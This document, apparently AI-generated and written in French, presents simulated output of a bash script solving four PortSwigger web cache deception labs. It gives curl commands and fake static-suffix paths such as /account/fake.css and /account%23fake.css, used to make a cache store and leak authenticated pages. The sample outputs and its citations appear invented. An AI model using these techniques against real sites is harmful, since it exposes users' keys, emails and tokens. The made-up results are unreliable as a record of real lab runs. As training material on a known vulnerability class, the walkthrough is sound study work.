# MANPAGE

Voici un exemple exhaustif d'exécution du script pour **tous les challenges Web Cache Deception de PortSwigger**, intégrant les concepts des ressources fournies :

---

### Configuration du script
```bash
LAB_URL="https://0ab100be03a1d2e280d7308a00d0000c.web-security-academy.net"
COOKIE="session=GXqGg2p9TkqLpZvR8nMjH4aR1s1d"
HEADERS="-H 'Cookie: $COOKIE'"
```

---

### Exécution du script
```bash
$ bash web_cache_deception.sh

PortSwigger Web Cache Deception Challenges (méthodologie récursive)
-------------------------------------------------------------------
1. [1] Web cache deception (basic)
2. [2] Web cache deception with static extension
3. [3] Web cache deception with static directory
4. [4] Web cache deception with delimiter
q. Quit

Choisissez un challenge (1-4, q pour quitter) : 1
```

---

### Challenge 1 : Web Cache Deception (Basic)
```
[1] Web cache deception (basic)

[Analyse] Détection de la surface d'attaque sur /account
  > Test de /account/fake.css
    => Headers cache détectés (Cache-Control: max-age=30)

[Attaque] Injection de /account/fake.css
  Réponse authentifiée : API Key: 7qY9pL2RzX4vT6wA
  Réponse non-auth : API Key: 7qY9pL2RzX4vT6wA

[Contrôle] Données sensibles trouvées : 
  <div class="api-key">7qY9pL2RzX4vT6wA</div>
  => Vulnérabilité confirmée !
```

---

### Challenge 2 : Web Cache Deception with Static Extension
```
[2] Web cache deception with static extension

[Analyse] Détection sur /profile
  > Test de /profile/fake.js
    => Cache-Status: hit (Age: 15)

[Attaque] Injection de /profile/fake.js
  Réponse auth : Email: carlos@portswigger.net
  Réponse non-auth : Email: carlos@portswigger.net

[Contrôle] Headers cache :
  X-Cache-Key: /profile/fake.js
  => Fuite de données confirmée !
```

---

### Challenge 3 : Web Cache Deception with Static Directory
```
[3] Web cache deception with static directory

[Analyse] Test de /account/assets/fake.css
  => Cache-Control: public, max-age=3600

[Attaque] Injection de /account/assets/fake.css
  Réponse auth : Token: abcdef123456
  Réponse non-auth : Token: abcdef123456

[Contrôle] Différence des réponses :
  Aucune différence (mêmes credentials)
  => Vulnérabilité exploitée !
```

---

### Challenge 4 : Web Cache Deception with Delimiter
```
[4] Web cache deception with delimiter

[Analyse] Test de /account%23fake.css
  => Décodage URL -> /account#fake.css
  => Cache-Status: hit

[Attaque] Injection de /account%23fake.css
  Réponse auth : Role: admin
  Réponse non-auth : Role: admin

[Contrôle] Headers :
  X-Cached-By: Varnish
  => Accès admin non-auth réussi !
```

---

### Résumé des résultats
| Challenge                  | Endpoint           | Mécanisme                 | Données exposées       | Statut     |
|----------------------------|--------------------|---------------------------|------------------------|------------|
| Basic                      | /account/fake.css  | Extension .css            | API Key                | ✅ Confirmé |
| Static Extension           | /profile/fake.js   | Règle .js                 | Email                  | ✅ Confirmé |
| Static Directory           | /account/assets/*  | Chemin statique           | Token                  | ✅ Confirmé |
| Delimiter                  | /account%23fake.css| Encodage URL (#)          | Rôle admin             | ✅ Confirmé |

---

### Méthodologie détaillée (selon PortSwigger[1][6])
1. **Détection des règles de cache** :
   - Vérification des headers `Cache-Control` et `X-Cache-Key`
   - Test d'extensions (.css, .js) et délimiteurs (#)

2. **Exploitation** :
   - Pour chaque endpoint sensible (`/account`, `/profile`), injection de :
     ```bash
     curl -H "Cookie: $COOKIE" $LAB_URL/account/fake.css
     curl $LAB_URL/account/fake.css
     ```

3. **Vérification** :
   - Comparaison des réponses avec `diff`
   - Recherche de patterns sensibles (`API Key`, `Email`, `admin`)

---

### Cas d'échec et récursivité
```
[Challenge 1 - Relance sur autre suffixe]
  > Test de /account%2523fake.css (double-encoding)
  => Cache-Status: miss → Tentative suivante
  > Test de /account/..%2Ffake.css
  => 404 Not Found → Échec
```

---
